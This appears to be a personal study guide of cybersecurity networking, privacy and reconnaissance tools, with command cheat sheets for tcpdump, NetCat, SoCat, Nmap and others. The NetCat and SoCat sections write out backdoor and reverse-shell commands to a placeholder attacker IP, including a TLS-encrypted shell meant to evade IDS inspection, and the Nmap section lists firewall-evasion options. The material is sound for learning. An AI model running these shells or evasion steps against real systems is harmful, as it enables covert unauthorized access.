# Cyber-Security Tools


## Networking Tools

### Remmina

Remmina is an open-source remote desktop client, mostly used in Linux by system administrators.  
It is written in C and based on the GTK+ toolkit.  
It supports multiple network protocols, including **RDP**, **VNC** and **SSH**.  
This makes it a versatile tool for connecting to remote computers and servers.


### NetSpot

NetSpot is a software tool for wireless network assessment, scanning and survey.  
It can analyze Wi-fi coverage and performance.  
It runs on Windows and MacOS.  
It is used to analyze radio signal leaks, map channel use, optimize wireless AP locations...


### tcpdump

tcpdump is a console network packet analyzer written in C++.  
It uses the `libpcap` C++ library to capture the network packets reaching the network cards.  

The `tcpdump` command requires the root privilege to capture packets (either `sudo` or run as root).

```shell
tcpdump                                     # check that tcpdump is working (but too generic to be useful)
tcpdump -i eth0                             # listens to a specific network interface ("-i any" to use all interfaces)
tcpdump -i eth0 -w capture.pcap             # specify the packets capture file to write the packets into
tcpdump -r capture.pcap                     # read packets from a packets capture file
tcpdump -c 1234                             # limit the number of captured packets (otherwise, use Ctrl-C to stop the capture)
tcpdump -n                                  # prevent DNS lookup (show IP instead of resolved domain name)
tcpdump -nn                                 # prevent both DNS and port lookup (show port number instead of protocol name)
tcpdump -v                                  # produce more output (also -vv and -vvv for higher verbose levels)

tcpdump -q -r capture.pcap                  # quick output (timestamp + source/dest IP and port)
tcpdump -e -r capture.pcap                  # print link-level header (source/dest MAC address)
tcpdump -A -r capture.pcap                  # print the packet data in ASCII
tcpdump -xx -r capture.pcap                 # print the packet data in hexadecimal
tcpdump -X -r capture.pcap                  # print the packet header and data in hexadecimal and ASCII side-by-side
```

We can apply different filters to the captured or displayed packets to only target specific packets.  
For a complete list of available filters, refer to `man pcap-filter`.

```shell
# filter by host
tcpdump host example.com -w capture.pcap        # specific host (src or dst)
tcpdump src host example.com -w capture.pcap    # specific source host
tcpdump dst host example.com -w capture.pcap    # specific destination host

# filter by port
tcpdump port 53 -w capture.pcap                 # specific port (src or dst)
tcpdump src port 53 -w capture.pcap             # specific source port
tcpdump dst port 53 -w capture.pcap             # specific destination port

# filter by protocol
tcpdump icmp -w capture.pcap                    # specific protocol (ip, ipv6, icmp, tcp, udp...)

# filter by size
tcpdump greater 1000 -r capture.pcap            # packets bigger than 1000
tcpdump less 1000 -r capture.pcap               # packets smaller than 1000

# multiple filters
tcpdump icmp or udp -w capture.pcap             # OR logical operator
tcpdump host 1.1.1.1 and tcp -w capture.pcap    # AND logical operator
tcpdump not tcp -w capture.pcap                 # NOT logical operator
```

Some more advanced filtering allow to check some specific bytes in the header of each layer.  
We use the syntax `PROTOCOL[OFFSET:SIZE]` :
- `PROTOCOL` : protocol of the header containing the field to filter on : `arp`, `ether`, `icmp`, `ip`, `ip6`, `tcp`, and `udp`
- `OFFSET` : byte offset before the field to filter on in this header (0 for the first byte)
- `SIZE` : number of bytes to extract, default to 1

```shell
ether[0] & 1 != 0               # true if the first bit of the first byte of the Ethernet header is 1 (multicast address)
```

A built-in version of these filters is available to check TCP flags.  
`tcp[tcpflags]` gets the byte of the TCP flags, and each individual flag is accessible with `tcp-syn`, `tcp-ack`, `tcp-fin`, `tcp-rst`, `tcp-push`.

```shell
tcpdump "tcp[tcpflags] == tcp-syn"                 # TCP packets where only the SYN flag is set
tcpdump "tcp[tcpflags] & tcp-syn != 0"             # TCP packets where at least the SYN flag is set
tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"   # TCP packets where at least the SYN or ACK flag is set
```

### WireShark

WireShark is an open-source network packet analyzer offering a GUI to capture, analyze and load network packets.  

WireShark was first released in 1998 under the name "Ethereal" and renamed to "WireShark" in 2006.  
Many people contributed to it to add support for more protocols.  
In 2023, it moved to the WireShark Foundation non-profit corporation that promotes network education and hosts SharkFest
(WireShark developer and user conferences).  
A command-line version of WireShark is also available, called **TShark**.  

WireShark can load packets captures (PCAP) created by WireShark or other packets analyzers (like the `tcpdump` console tool).  
WireShark lists all captured or received packets, and for each packet it displays the info at each layer, and the original bytes.  
The packets can be colored (_View > Colorize Packet List_) and the coloring rules can be customized (_View > Coloring Rules_).   

We can start and stop live network sniffing with the Shark button and the red button next to it.  
We can display information about the currently loaded package, like the capture time, number of packets... (_Statistics > Capture File Properties_).

In a WireShark packets list, we can find packets by string or regex (_Edit > Find Packet_).  
It lets us choose which frame the requested search should be performed in (Packet list, Packet details or Packet bytes).

A packet can be marked for later review, by right-clicking it in the packet list.  
It will be displayed in black in the packet list, but the marking only last while the capture file is open.  
Similarly, a comment can be added to a packet, and it will stay within the captured file.

Specific packets can be exported for later analysis from the Files menu.

By default, WireShark displays the time of each packet in seconds since the beginning of the capture.  
We can modify that to display UTC date/time for example, from _View > Time Display Format_.

We can display expert info by clicking the small round icon at the bottom left of WireShark.  
It displays several warnings and errors that could require attention.

#### Filters

WireShark offers powerful filtering capabilities, both for capturing and for displaying packets.

On any cell in the packet list or value in the packet details, we can right-click and select "Apply as Filter".  
This creates a display filter and only shows the packets that have this specific value in that column.  
We can also select "Prepare as Filter" to create multiple conditions before actually applying the filter.

We can also filter the displayed packets to a single conversation between 2 machines, by right click > Conversation Filter.

Some columns can be added to the packets list by selecting a value in the packet details and right-click > Apply as Column.

WireShark shows all packets (IP-level PDU) that traverse the network.  
It allows to reconstruct the streams from these packets, to reconstruct TCP or HTTP exchanges for example.  
This can reveal some cleartext usernames and passwords for non-encrypted protocols.  
This reconstruction is performed by _right-clicking a packet > Follow Stream_.


### NetCat / Ncat

**NetCat** is a command-line utility available on Windows and Linux to read from and write to network connections.  
It offers a backend for other machines to connect to a machine.  
It is often used to create a backdoor to access a machine remotely.

NetCat can be used in multiple ways :
- data transfer
- relay
- port scanning
- reverse shell / backdoor
- chat

```shell
# start NetCat in listening mode on port 1234 (for a reverse shell for example)
nc -l -p 1234

# from another machine, open a connection to it (for chat for example)
nc <TARGET_IP> 1234

# start Netcat in listening mode and start a bash shell when a client connect
# -e specifies a program to start on connect, it is used a lot to create backdoors
nc -lnpv 1234 -e /bin/bash

# start NetCat as a proxy listening on port 1234 and redirecting to a target host/port
nc -l -p 1234 | nc <TARGET_HOST> <TARGET_PORT>

# use NetCat for scanning ports on a target machine
# -v is for verbose mode and -z for scanning mode (without sending data)
nc -v -z <TARGET_HOST> <START_PORT>-<END_PORT>
```

We can use the `rlwrap` tool (Readline Wrapper) to enhance the usability of the `nc` command.  
It adds command history navigation (with up/down arrows) and line editing :
```shell
rlwrap nc -lp 1234
```

**Ncat** is an enhancement of Netcat created by the Nmap project.  
It supports for example IPv6, and SSL encryption for the listener with the `--ssl` parameter :
```shell
ncat --ssl -lvnp 1234
```


### SoCat

**SoCat** is a "super NetCat" offering additional advanced features but with a more complex syntax.  
It adds SSL/TLS encryption (like NCat), more complex redirection, and more stable connections.  
SoCat essentially is a connector between two different points (port, keyboard, file...).

_Basic use of SoCat (equivalent to NetCat)_
```shell
# Reverse-shell : simple listening connection on a TCP port, equivalent to "nc -lvnp 443"
# It binds a listening port with the standard output (represented with a dash)
# Note that this type of listener can be connected to by SoCat but also by basic Netcat or Netcat with rlwrap
socat TCP-L:443 -

# from the target machine, connect to the above reverse shell
socat TCP:<ATTACKER_IP>:443 EXEC:powershell.exe,pipes    # Windows target ("pipes" forces Windows to use Linux-style I/O)
socat TCP:<ATTACKER_IP>:443 EXEC:"bash -li"              # Linux target

# Bind-shell : simple listening connection on the target machine
socat TCP-L:443 EXEC:powershell.exe,pipes    # Windows target ("pipes" forces Windows to use Linux-style I/O)
socat TCP-L:443 EXEC:"bash -li"              # Linux target
 
 # from the attacker machine, connect to the above bind shell
 socat TCP:<TARGET_IP>:443 -
```

_Advanced use of SoCat for more stable shell (Linux only)_
```shell
# start a listener connecting the open port with the file descriptor of the current terminal (instead of the terminal output)
# this allows to pass options "raw" and "echo=0" to force it to forward raw data without interpreting them
socat TCP-L:443 FILE:`tty`,raw,echo=0

# from the target machine, connect to that listener
# This requires SoCat to be available on the target machine (usually downloaded as a pre-compiled binary)
# We pass a number of options to stabilize the shell
socat TCP:<ATTACKER_IP>:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

We can use encryption with OpenSSL to encrypt the traffic and prevent IDS to analyze it.  
This requires to create a certificate locally, and use it without verification :
```shell
# local machine : create a new 2048-bit RSA key with its certificate
# All requested info can be left blank or use random values
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# local machine : merge the key and the certificate files into a single PEM file
cat shell.key shell.crt > shell.pem

# local machine start a SoCat listener using that key/certificate
# Note that we could use here the more stable version using the tty file descriptor as well
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -

# target machine : connect to the above listener
socat OPENSSL:<ATTACKER_IP>:443,verify=0 EXEC:/bin/bash
```


### OpenSSL

[OpenSSL](https://www.openssl.org/) is an open-source command-line tool for cryptography and secure communications.  
It is commonly used to generate private keys, create CSRs, install an SSL/TLS certificate, and identify certificate information.


### Snort

Snort is the most widely used open-source IDS solution.  
It uses both signature-based and anomaly-based detection to identify threats.  
It contains many built-in rules containing known attack patterns, and custom rules can be added.

Snort has 3 different modes :
- **packet sniffer mode** : just read and display network packets in the console without performing analysis (doable with WireShark)
- **packet logging mode** : similar to packet sniffer but generate a PCAP with the traffic and the detection (doable with WireShark)
- **NIDS mode** : monitor network traffic in real-time to match known attacks stored as signatures and generate alerts (most popular mode)

It can be installed with `sudo apt install snort`.  
If run normally, it only captures the traffic intended for its host.  
To use it as a NIDS or NIPS, we need to turn on the promiscuous mode of the host's network interface (to not discard traffic for other hosts).  

Snort 3 uses LUA for its configuration file in `/etc/snort/snort.lua`.  
Snort rules are stored in `/etc/snort/rules/`, and custom rules should be added to its `local.rules` file.

Snort can also run its analysis on a PCAP file, and generate the alerts in the terminal.


### Impacket / Scapy

**Impacket** is a collection of Python classes for working with network protocols.  
It supports multiple protocols like SMB, MS-RPC and LDAP...  
It can be used to launch SMB or LDAP relay attacks for example.

```python
from impacket.smbconnection import SMBConnection

conn = SMBConnection('10.10.10.2', '10.10.10.2')
conn.login('guest', '')
shares = conn.listShares()
for share in shares:
    share_name = share['shi1_netname'].strip()
    share_comment = share['shi1_remark'].strip()
    print(share_name, share_comment)
conn.logoff()
```

**Scapy** is a Python library to craft custom packets at a lower-level.  
Unlike Impacket, it is not protocol-specific, it exposes classes like IP, TCP, ARP, ...  
It can be used for example for ARP scanning or TCP SYN Flood attack.

```python
from scapy.all import *

# Create the IP layer of the packet
ip_layer = IP()
ip_layer.dst = "192.168.10.1"
ip_layer.src = "192.168.10.2"   # optional

# Create the TCP layer of the packet
tcp_layer = TCP()
tcp_layer.dport = 80
tcp_layer.sport = 6666     # optional
tcp_layer.flags = "S"      # SYN flag set

# Create and send the packet
packet = ip_layer / tcp_layer
send(packet)

# print packet details
print(packet.show())
```


### CyberDuck

[CyberDuck](https://cyberduck.io/) is a free server and cloud storage browser on Mac and Windows.  
It supports many storage technologies, including FTP, SFTP, AWS S3, MS Azure, Google Drive, OneDrive, DropBox... 



## Privacy Tools


### NordVPN / TunnelBear / CyberGhost

NordVPN, TunnelBear and CyberGhost are 3 popular VPN services that offer secure and private internet connections.

NordVPN offers strong security features and commitment to user privacy.  
TunnelBear has less features but has a more intuitive GUI that makes it a good choice for beginners.  
CyberGhost is an intermediate solution balancing a good range of features with an intuitive GUI. 


### Brave / Ghostery

**Brave** is a Chromium-based web browser focusing on privacy.  
It blocks fingerprinting, ads and ad-trackers by default.

**Ghostery** is a privacy suite offering ads and trackers blocker, a search engine and a web browser.  
It can be installed as a plugin on most popular browsers (Chrome, Firefox, Edge, Safari, Opera).


### Tor browser (The Onion Router)

Tor is a web browser transferring the incoming traffic through a network of computers to provide anonymity and untraceability.  
Requests sent to Tor go to 3 Tor relays before being sent to the target website.  
The communication is encrypted between all Tor relays.  

Files downloaded with Tor should NEVER be open while online as they can reveal the user's real IP.  

Tor is not useful to download torrents, since they tend to ignore proxy settings and make direct transfer, use a VPN instead.

Since Tor provides good anonymity, it is used by many cyber-criminals.  
Tor users can be flagged as "extremists" and "persons of interest" by the NSA, which cannot distinguish good and bad Tor users.  
Many websites (Nike, Expedia, ...) block all connections from Tor machines.  

The main attack on Tor is called the **end-to-end correlation attack**.  
It consists in monitoring the requests entering the Tor network and the requests getting out of the Tor network, and try to correlate them to deduce the user that sent the request.  
This can be made harder when using HTTPS (so the request is encrypted even before and after the Tor network) but it is 
still possible to correlate the timing between entering and exiting requests in the Tor network.

Users of Tor can access the darkweb (websites that are not referenced by search engines).  
Accessing the darkweb is legal, but a lot of the services offered on darkweb sites are illegal.  
All transactions on the darkweb are settled in bitcoin.

We can use a VPN to connect to Tor, it hides to the ISP that we access Tor, and it prevents the Tor network entry point
to see our real IP (but the VPN provider knows it).

```shell
sudo apt install tor
sudo systemctl start tor
```

### ProxyChains

ProxyChains is a Linux tool that forces any TCP connection by a given application to go through a chain of proxy servers.  
It improves anonymity and can bypass network restrictions.  

We can customize the settings via the configuration file `/etc/proxychains4.conf`.  
We usually add `socks5 127.0.0.1 9050` so it can use the Tor service on the local machine (running on port 9050 by default).  

```shell
# install ProxyChains
sudo apt install proxychains4

# edit the configuration file to setup the proxies to use
sudo vim /etc/proxychains4.conf

# check the IP address
curl ifconfig.me                     # show real IP address
proxychains4 curl ifconfig.me        # show the IP address of a Tor node
```


### ProtonMail

ProtonMail is an email service provider focused on privacy and security based in Switzerland.  
The free version offers 1 address (xxx@protonmail.com) and 500Mb of storage.  
The paid version allows to use a custom domain and get rid of the ProtonMail signature.


### CCleaner and BleachBit

CCleaner and BleachBit are two cleaner programs for Windows.  
They can help to remove useless files, clear caches, remove cookies and free up disk space.


### macchanger

**macchanger** is a command-line utility available on Kali to change our MAC address.  

```shell
# check the MAC address of a network card
macchanger -s eth0
ip link show eth0            # alternative with the "ip" command

# use a custom MAC address (to be authorized in a white list for example)
sudo macchanger -m 00:11:22:33:44:55 eth0

# use a random MAC address
sudo macchanger -r eth0

# reset the original MAC address
sudo macchanger -p eth0
```


## Reconnaissance Tools


### OSINT Framework

OSINT tools provide information from free public resources on the Internet.  
It is the main element of passive reconnaissance.  

Many OSINT resources are categorized in the OSINT framework website : [https://osintframework.com/](https://osintframework.com/)


#### whois

`whois` is a command-line tool to query WHOIS servers to know who a domain is registered to.  
It gives information about the creation date, registrar, admin organization, name server...

The domain registrar is responsible for maintaining the WHOIS records of the domains it is leasing.  
These WHOIS records can be queried with the `whois` command or an online WHOIS service.

Querying WHOIS records is part of passive reconnaissance, since it communicates with the registrar and not the target.

```shell
whois google.com
```


### ICANN Lookup

ICANN Lookup is a centralized database containing public info on registered domain names.  
It is the reference to obtain official and up-to-date info on a domain name.  
It usually contains less info than the WHOIS records maintained by the registrar. 


#### nslookup / dig

`nslookup` is a command-line tool used to query a DNS server for DNS records.  
It was the main tool to troubleshoot DNS related issues and verifying the DNS configuration.  
It is now replaced by `dig` that provides more info (Domain Information Groper).

We can specify a DNS server if we do not want the default one of our ISP :
- CloudFlare offers `1.1.1.1` and `1.0.0.1`
- Google offers `8.8.8.8` and `8.8.4.4`
- Quad9 offers `9.9.9.9` and `149.112.112.112`

DNS lookup is part of passive reconnaissance, since it communicates with public DNS servers outside of the target network.

```shell
nslookup facebook.com                # query the IPv4 and IPv6 addresses for a domain name
nslookup 142.250.196.132             # reverse lookup, query the domain name for an IP address
nslookup -type=MX facebook.com       # query the hostname of the mail server for a domain name
nslookup -type=SOA facebook.com      # query the SOA data for a domain name (name server, admin email, TTL...)
nslookup facebook.com 8.8.8.8        # use a custom DNS server (8.8.8.8 is Google's public DNS server)

dig facebook.com                     # query the IPV4 for a domain name
dig facebook.com +short              # short response of the above command with just the IP address
dig facebook.com MX                  # query the IPV4 of the mail server for a domain name
dig facebook.com @8.8.8.8            # query the IPV4 for a domain name using a specific DNS server
dig -x 69.63.176.13                  # perform a reverse lookup, same as : dig <IP> PTR
```

### dnsenum

dnsenum is a DNS reconnaissance tool for penetration testing.  
It is used to enumerate all subdomains, name servers, mail servers and DNS records for a given domain.  
It can perform brute-force subdomain discovery using a wordlist.  
It supports zone transfer attempt (if the DNS is misconfigured).  
A zone transfer is a mechanism to sync records between the primary and secondary name servers, exposing all DNS records.  

```shell
dnsenum --dnsserver 8.8.8.8 example.com
```


### DNSDumpster.com

DNS lookup tools (nslookup / dig) provide info on a domain but cannot find subdomains.  
[DNSDumpster.com](https://dnsdumpster.com/) is a domain research website that finds subdomains for a given domain.  
It provides info on each of these domains in a table and a graph.  
Its free version is limited to 50 subdomain per query.

DNSDumpster also provides an API to use its service programmatically.


### Amass

Amass is an open-source command-line tool developed by OWASP for in-depth DNS subdomains enumeration.  
It uses multiple techniques to gather information, like passive info gathering, active DNS probing and subdomain brute-force.   
It integrates with over 80 data sources and API and is regularly updated to stay up-to-date.  
Amass also checks CT logs to find DNS information.  

```shell
# the enum command discovers sub-domains of a given domain 
amass enum -d example.com -src             # simple DNS subdomains enumeration for a target and show the source of each found subdomain
amass enum -d example.com -passive         # only use passive enumeration (no probe to the target)
amass enum -d example.com -brute           # try to brute-force sub-domains

# the intel command discovers domain for a target
amass intel -org "Facebook"                # identify domains for an organization name 
amass intel -cidr 104.16.0.0/12            # identify domains for a CIDR range
```


### Shodan.io

The Shodan database is an Internet repository maintaining indexes of all services presented to the Internet.  
It is used as a search engine for various types of devices (webcam, router, server)...  
It allows to search devices by keyword, and it lists all devices of every type that matches the search criteria.  
It also allows to configure alerts that trigger when a new device matching some criteria becomes accessible on the Internet.

The Shodan.io database is used during the passive reconnaissance phase of penetration testing on a target domain or network.


### Censys.io

Like Shodan, Censys collects and indexes data about connected devices by scanning the internet.  
It offers powerful querying capabilities, like specific OS version, specific security misconfiguration, specific IP range...  
It also provides visualization of the distribution and security of devices.  
For each found device, it lists open ports and detected services (similar info to nmap).  

Censys also offers API access to integrate its search capabilities into custom programs.  


### arp-scan

arp-scan is a Linux command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.  
It is used to identify which machines are active on the local network.  
It requires sudo privilege to generate ARP packets.

```shell
# arp-scan can figure out the IPs to try from the network we are connected to
sudo arp-scan --localnet

# scan a specific subnet on a specific network interface
sudo arp-scan -I eth0 192.168.1.0/24
```


### Nmap (Network Mapper)

Nmap is a network scanner used to discover machines on a network.  
Nmap can scan a machine for open ports and detect the version of programs running on these ports.

Nmap's default port scan sends packets to the target machines on every port, which can be intrusive.  
It may be detected by the IDS of the target, and further requests may be blocked by their firewall.  
Nmap comes with various options to customize the type of scan, with different stealth levels.

Nmap also comes with a collection of scripts used to detect vulnerabilities on the target network.

Nmap should be executed with `sudo` to allow all types of packages (not just ICMP and TCP).  
When executed by a privileged user (root or user allowed to use sudo), host discovery on a local network uses ARP.  
On a different network, host discovery uses ICMP echo requests, TCP ACK to port 80 and TCP SYN to port 443.  
If the user is unprivileged, it can only use a full TCP 3-way handshake to port 80 and 443, that takes more time. 

When targeting a local network, Nmap can identify the MAC address (and manufacturer) of each network card.

Nmap can spoof the source MAC address and IP address with any given value.  
In that case, the response would be sent to the spoofed IP, so it only makes sense if we can monitor the network.

A good cheat sheet for Nmap arguments is available on [StationX](https://www.stationx.net/nmap-cheat-sheet/).

```shell
nmap                                 # display the help
nmap 192.168.0.1 -v                  # increase logging level of the result (-vv for even more logging)
nmap 192.168.0.1 -d                  # debugging mode (thousands of lines)
nmap 192.168.0.1 --reason            # explain the reason why Nmap concluded ports are open/closed/filtered
```

#### Target Selection

```shell
nmap 192.168.0.1                     # scan a machine by IP (machine discovery + port scan)
nmap scanme.nmap.org                 # scan a machine by hostname
nmap microsoft.com/24                # scan a network by domain name
nmap -iL target_ips.txt              # scan a list of IPs from a file (one IP per line)
nmap -iR 10                          # scan 10 random targets on the internet
```

#### Host Discovery

Nmap has many different methods to discover which hosts are active.  
Different methods can be efficient against different networks, to avoid firewalls or IPS.  
Host discovery parameters start with `-P` for "ping". 

```shell
nmap 192.168.0.1/24 -sL              # List IP addresses to scan and do a reverse DNS lookup (no package sent to the target)
nmap 192.168.0.1/24 -sn -PE          # host discovery using an ICMP Echo Request (ICMP type 8) [often blocked by firewalls]
nmap 192.168.0.1/24 -sn -PP          # host discovery using an ICMP Timestamp Request (ICMP type 13)
nmap 192.168.0.1/24 -sn -PM          # host discovery using an ICMP Address Mask Request (ICMP type 17)
nmap 192.168.0.1/24 -sn -PR          # host discovery using ARP (only possible on a local network)
nmap 192.168.0.1/24 -sn -PS80        # host discovery using TCP SYN to given port(s), expecting SYN-ACK (open port) or RST (closed port)
nmap 192.168.0.1/24 -sn -PA80        # host discovery using TCP ACK to given port(s) [only works for privileged uses, otherwise full 3-way handshake]
nmap 192.168.0.1/24 -sn -PU          # host discovery using UDP to given port(s) [expects nothing for open port and ICMP Port Unreachable on closed port]
nmap 192.168.0.1/24 -Pn              # Skip host discovery and launch port scan assuming all targets are up
                                     # This is useful because -sS will skip the hosts that did not respond to ICMP during host discovery
                                     # With the -Pn option, these hosts are scanned anyway and some services may be up 
                                     # This allows service detection on hosts configured to not respond to ICMP 
nmap 192.168.0.1/24 -n               # prevent the reverse-DNS request on discovered hosts
nmap 192.168.0.1/24 -R               # query the DNS server for reverse-DNS even for offline hosts
```

#### Port Scanning Techniques

Nmap can use many types of packets to discover which ports of the target are open.  
They can use a full TCP handshake (only option if no sudo permission), TCP SYN only, UDP...  
The packets can be crafted to customize the TCP flags that are set to avoid firewall filtering.  
Port scanning parameters start with `-s` for "scan".

```shell
nmap 192.168.0.1 -sn                 # skip port scan (host discovery only)
nmap 192.168.0.1 -sT                 # TCP Connect scan
                                     #  -> try to complete a full TCP handshake with every port to scan
                                     #  -> teardown established connections with a RST-ACK packet just after the ACK
                                     #  -> very slow, more detectable, but only possible port scan without sudo permission
nmap 192.168.0.1 -sS                 # TCP SYN port scan (default - stealth scan as it is not very noisy)
                                     #  -> only performs the first step of the TCP handshake (SYN)
                                     #  -> reply to the SYN-ACK from the target with a RST 
                                     #  -> does not complete the 3-way handshake so less likely to be logged
nmap 192.168.0.1 -sU                 # UDP port scan, to target machines that use UDP-based protocols (DNS, DHCP, NTP, SNMP...)
                                     # -> expect no response if the port is open or filtered
                                     # -> expect an ICMP packet type 3 (Port unreachable) if the port is closed

# Nmap can customize the TCP flags on the packets sent to the target
# There are many variations of these flags available as parameters 
# If a port is open, it would not respond to a TCP packet without the SYN flag that is not part of an on-going TCP session
# If a port is closed, the machine would respond with a RST packet 
# Note that this DOES NOT WORK ON WINDOWS, because Windows return a RST for every non-SYN packet (even for open ports)                                 
nmap 192.168.0.1 -sN                 # TCP Null scan, with all TCP flags unset (URG / ACK / PSH / RST / SYN / FIN)
                                     # On open ports, it should not receive any response (because the SYN flag is unset)
                                     # On closed ports, it should receive a RST TCP packet
nmap 192.168.0.1 -sF                 # TCP FIN scan, with only the FIN flag set
                                     # Like the Null scan, no response means either open port or traffic filtered by a firewall
                                     # on closed port, a RST packet is received if no firewall filtering
nmap 192.168.0.1 -sX                 # TCP Xmas scan, with the URG / PSH / FIN flags set
                                     # Like the Null scan and FIN scan, no response means either open port or filtered traffic
                                     # less stealthy than FIN scan because unusual combination of flags
                                     # can be useful if single-flag packets are filtered
nmap 192.168.0.1 -sM                 # TCP Maimon scan, with the FIN and ACK flags set
                                     # most systems would respond with RST regardless of the port state, which makes it useless.
                                     # some old systems would respond with a RST only if the port is closed
nmap 192.168.0.1 -sA                 # TCP ACK scan, with only the ACK flag set
                                     # it is responded with a RST regardless the state of the port, so it can't tell if a port is open.
                                     # it is used to detect firewalls, because only the presence of a firewall would cause no response
                                     # if a firewall filters everything except ports 80 and 22, we can guess that these ports are open
nmap 192.168.0.1 -sW                 # TCP window scan, similar to ACK scan but checks the window field of the RST response
nmap 192.168.0.1 --scanflags URGACK  # scan with a custom combination of flags
                                     # for all flags use URGACKPSHRSTSYNFIN

nmap  -sI <ZOMBIE_IP> 192.168.1.1    # Idle scan - require a host connected to the target network that is idle (no traffic)
                                     # this scan is used when only an IP in the target network can reach the target machine
                                     # Nmap spoofs the request to the target with the zombie IP
                                     # It is done in 3 steps :
                                     # - send a SYN/ACK to the zombie and receive a RST with the zombie's IP ID
                                     # - send a TCP SYN to the target spoofed with the zombie IP
                                     #   if the port is open on the target, the target sends a SYN/ACK to the zombie
                                     #   in that case the zombie replies with a RST, incrementing its IP ID
                                     # - send again a SYN/ACK to the zombie, and compare its IP ID to see if it was incremented twice
```

#### Target ports specification

```shell
# PORTS TO SCAN 
nmap 192.168.0.1 -F                  # limit the scan to the top 100 ports (instead of 1000 by default)
nmap 192.168.0.1 -p68-150            # limit the scan to the specified ports
nmap 192.168.0.1 -p-25               # limit the scans to ports 1 to 25 when no lower bound specified
nmap 192.168.0.1 -p-                 # scans all ports (1 to 65535) when no bound specified, most time-consuming and thorough scan
```

#### Information gathering

```shell
nmap 192.168.0.1 -O                  # enable OS detection
nmap 192.168.0.1 -sV                 # enable service detection on each scanned port (requires a full TCP handshake)
nmap 192.168.0.1 -A                  # Aggressive scan (full port scan, OS and service detection, script scanning, traceroute)
```

#### Firewall Evasion

```shell
nmap 192.168.0.1 -S <IP>             # spoof the source IP address
nmap 192.168.0.1 --spoof-mac <MAC>   # spoof the source MAC address (only make sense when on the local network)
nmap 192.168.0.1 -f                  # fragment the data into 8-bytes packets so firewalls don't know it comes from Nmap by the packet size
nmap 192.168.0.1 --mtu 16            # same but with a custom max size (must be a multiple of 8)
nmap 192.168.0.1 -D 192.168.0.1,192.168.0.3,ME   # use decoys to spoof the source IP address (ME for the local machine)
                                     # the scan appears to come from multiple sources (including us)
                                     # should use live decoys that do not look suspicious to the target
nmap 192.168.0.1 -g 53               # use a specific source port, should use trusted port numbers like 53 (DNS), 20 (FTP), 67 (DHCP) or 88 (Kerberos)
```

We can control the speed of the requests sent by Nmap, to get a result very quickly or to slowly send requests to avoid detection.  
Nmap has 6 speed levels that can be referenced either by ID or by name with the `-T` parameter :
- level 0 : `paranoid`
- level 1 : `sneaky` (often used in penetration testing when stealth is important)
- level 2 : `polite`
- level 3 : `normal` (default)
- level 4 : `aggressive` (often used in CTF)
- level 5 : `insane` (increased risk of packet loss)

```shell
nmap 192.168.0.1 -sS -F -T2                 # level 2
nmap 192.168.0.1 -sS -F -T aggressive       # level 4

nmap 192.168.0.1 --min-rate 10 -F           # min number of packets per second
nmap 192.168.0.1 --max-rate 10 -F           # max number of packets per second
nmap 192.168.0.1 --host-timeout 100 -F      # specify the max time we can wait for a host to respond
```

#### Nmap Scripting Engine (NSE)

The NSE is a Lua interpreter integrated in Nmap that supports the execution of custom Lua scripts.  

The default Nmap installation contains around 600 scripts in the `/usr/share/nmap/scripts` folder.  
We can find on the Nmap website the documentation and categories of every built-in script : https://nmap.org/nsedoc/scripts/

The built-in scripts are divided into multiple categories (a script can be in multiple categories) : 
- `auth` : authentication related scripts
- `broadcast` : discover hosts by sending broadcast messages
- `brute` : bruteforce password cracking
- `default` : default scripts running with `-sC` (quick, valuable and concise output)
- `discovery` : scripts retrieving information about the target like database tables and DNS names
- `dos` : detect Denial of Service vulnerabilities
- `exploit` : attempt to exploit multiple vulnerable services
- `external` : checks based on 3rd party services (Geoplugin, VirusTotal...)
- `fuzzer` : fuzzing attacks
- `intrusive` : intrusive scripts (bruteforce, exploitation...)
- `malware` : scan for backdoors
- `safe` : safe scripts that cannot crash the target
- `version` : retrieve service versions
- `vuln` : scan for vulnerabilities

```shell
nmap 192.168.0.1 -sC                    # run the scripts in the default category
nmap 192.168.0.1 --script vuln          # run the scripts in the vuln category
nmap 192.168.0.1 -sV --script=banner    # run the banner grabbing script
nmap 192.168.0.1 --script "http-date"   # run a script by name
```

We can add NSE scripts to enrich Nmap's capabilities, either custom scripts or from online repositories.  
Popular repositories are `nmap-vulners` and `vulscan`.  

```shell
# add Nmap scripts from public repositories
cd /usr/share/nmap/scripts
git clone https://github.com/vulnersCom/nmap-vulners.git
git clone https://github.com/scipag/vulscan.git

# run the scripts against a target
nmap --script nmap-vulners -sV 10.10.0.1
nmap --script vulscan -sV 10.10.0.1
        
# vulscan scripts take very long because they contain many vulnerability DBs (represented by CSV files)
# we can limit the scan to a single vulnerability DB or a single port
nmap --script vulscan --script-args vulnscandb=exploitdb.csv -sV 10.10.0.1
nmap --script vulscan --script-args vulnscandb=exploitdb.csv -sV 10.10.0.1 -p21    # limit to FTP
```

#### Nmap output file

```shell
nmap 192.168.0.1 -oN result.nmap       # save to file in normal human-readable output
nmap 192.168.0.1 -oX result.xml        # save to file in XML output
nmap 192.168.0.1 -oG result.gnmap      # save to file in greppable output (most info on one line)
nmap 192.168.0.1 -oA result            # save output to all above 3 formats
```


### Maltego

Maltego is a data-mining tool offering a GUI for linking and visualizing relationships between resources.  
It can represent many types of resources like people, email, machines, IP addresses...  

Maltego contains many built-in "transforms" that pull data from multiple sources.  


### Recon-ng

Recon-ng is a command-line reconnaissance tool shipped with Kali Linux.  
Its purpose is similar to Maltego, but it offers a custom DSL in the terminal instead of a GUI.  
The terminal interaction is close to Metasploit for exploits, with modules that can be searched, loaded, configured and run. 

```shell
recon-ng                          # start the Recon-ng DSL
help                              # show all available commands of the DSL
back                              # quit the loaded module or workspace, or exit Recon-ng
exit                              # quit Recon-ng

marketplace search                                      # list all modules of the marketplace
marketplace search whois                                # list all modules containing "whois"
marketplace install all                                 # install all available modules
marketplace install recon/domains-contacts/whois-pocs   # install a module by name

workspaces list                   # show all workspaces
workspaces create google          # create a workspace called "google" and load it
workspaces load google            # enter inside the "google" workspace

show                              # list all available item types (company, email, ...) in the loaded workspace
show companies                    # list all companies registered in the workspace
show contacts                     # list all contacts registered in the workspace
db insert companies               # insert a new company item in the workspace (prompt for company details)
db insert domains                 # insert a new domain name in the workspace (prompt for domain details)
db schema                         # show the database schema for this workspace

